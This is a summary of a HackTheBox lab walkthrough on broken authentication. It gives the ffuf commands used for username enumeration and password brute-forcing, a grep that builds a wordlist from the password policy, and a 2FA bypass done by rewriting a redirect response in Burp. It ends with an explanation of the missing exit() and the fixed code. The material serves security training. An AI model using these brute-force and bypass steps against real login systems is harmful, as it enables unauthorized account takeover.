# HackTheBox Broken Authentication (Skills Assessment)

**Reference:** [Read Full Walkthrough by N0UR0X01 on Medium](https://medium.com/@N0UR0X01/hackthebox-broken-authentication-skills-assessment-c43feaab1a52)

---

### Step 1: Accessing the Application

The first thing he did was access the given **IP address** using his browser. A login page appeared.

To test the behavior, he tried entering random credentials:

```
username: nour  
password: nour
```

The server responded with:

```
"Unknown username or password"
```

This was his first observation — the error message was generic and didn’t clarify whether the problem was with the username or the password.

---

### Step 2: Registering a New Account

He noticed a link saying “Register a new account” and decided to try creating one.

He first tried:

```
nour:nour
```

But the application rejected it, showing that it had a **password policy** in place.

He then created an account using:

```
username: nour  
password: N0uR56789123
```

This time it worked and the account was successfully created.

---

### Step 3: Analyzing the Error Messages

He went back to the login page and attempted logging in with a valid username but an incorrect password:

```
username: nour  
password: LoL456789123
```

This time the response was:

```
"Invalid credentials"
```

So he made a key discovery:

* If the **username doesn’t exist**, the message is: `"Unknown username or password"`
* If the **username exists** but the password is wrong, the message is: `"Invalid credentials"`

This meant he could now perform **username enumeration** based on the error messages alone.

---

### Step 4: Enumerating Usernames Using ffuf

He decided to take advantage of that and used **ffuf** to brute-force usernames.

He used a well-known wordlist:
`xato-net-10-million-usernames.txt`

Using **Burp Suite**, he captured the necessary headers like:

* `Content-Type: application/x-www-form-urlencoded`
* `PHPSESSID=omnsv4jmtrvj05ur7qkhhqio3e`

The ffuf command he used was:

```bash
ffuf -u http://83.136.249.29:45638/login.php \
-w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt \
-H "Content-Type: application/x-www-form-urlencoded" \
-b "PHPSESSID=omnsv4jmtrvj05ur7qkhhqio3e" \
-d "username=FUZZ&password=N0uR56789123" \
-fr "Unknown username or password"
```

This helped him filter out responses and identify a **valid username**:

```
gladys
```

---

### Step 5: Preparing a Filtered Wordlist for Passwords

He remembered the application’s password policy:

* Must include **at least one digit**
* Must include **lowercase and uppercase letters**
* Must have **no special characters**
* Must be **exactly 12 characters long**

So instead of using the full rockyou.txt, he filtered it using:

```bash
grep -P '^(?=.*[0-9])(?=.*[a-z])(?=.*[A-Z])[a-zA-Z0-9]{12}$' rockyou.txt > password.txt
```

---

### Step 6: Brute-Forcing Password for gladys

He ran ffuf again, this time changing the payload to try passwords for the discovered user `gladys`:

```bash
ffuf -u http://83.136.249.29:45638/login.php \
-w password.txt \
-H "Content-Type: application/x-www-form-urlencoded" \
-b "PHPSESSID=omnsv4jmtrvj05ur7qkhhqio3e" \
-d "username=gladys&password=FUZZ" \
-fr "Invalid credentials"
```

Eventually, the correct password was found, and he was able to log in.

---

### Step 7: Two-Factor Authentication (2FA) Page

After logging in, the application redirected him to:

```
/2fa.php
```

He attempted to brute-force the OTP by generating a list:

```bash
seq -w 0 9999 > otp.txt
```

But this approach didn’t work — likely due to protection against rapid input.

---

### Step 8: Force-Browsing Attempt

He knew the app redirects to:

```
/profile.php
```

after successful 2FA.
So, he tried directly accessing it:

```
http://83.136.254.47:57509/profile.php
```

But he was redirected back to:

```
/2fa.php
```

---

### Step 9: Exploiting the Bypass with Burp Suite

Using **Burp Suite**, he intercepted the request to `/profile.php` and sent it to the **Repeater** tab.

The response came back with the actual content (including a flag), but with an HTTP status:

```
302 Redirect
```

So he changed the response status manually from `302` to `200`, forwarded it — and the protected content appeared in his browser.

---

### Step 10: Why Did That Work?

He analyzed the PHP code and found:

```php
if(!$_SESSION['active']) {
    header("Location: 2fa.php");
}
```

The problem was — the **developer forgot to add `exit;`** after the redirect.

So the page continued processing and returned the response **even though a redirect was triggered**.

Proper code should’ve been:

```php
if(!$_SESSION['active']) {
    header("Location: 2fa.php");
    exit;
}
```

---

## Summary

He combined several techniques:

* **Username Enumeration** based on error messages.
* **Password brute-forcing** using a filtered list matching policy.
* **Bypassing 2FA** through a logic flaw and force-browsing with Burp.

> This wasn’t just about running tools — it was about understanding how the application works, how to spot logical errors, and how to turn them into a complete exploitation path.
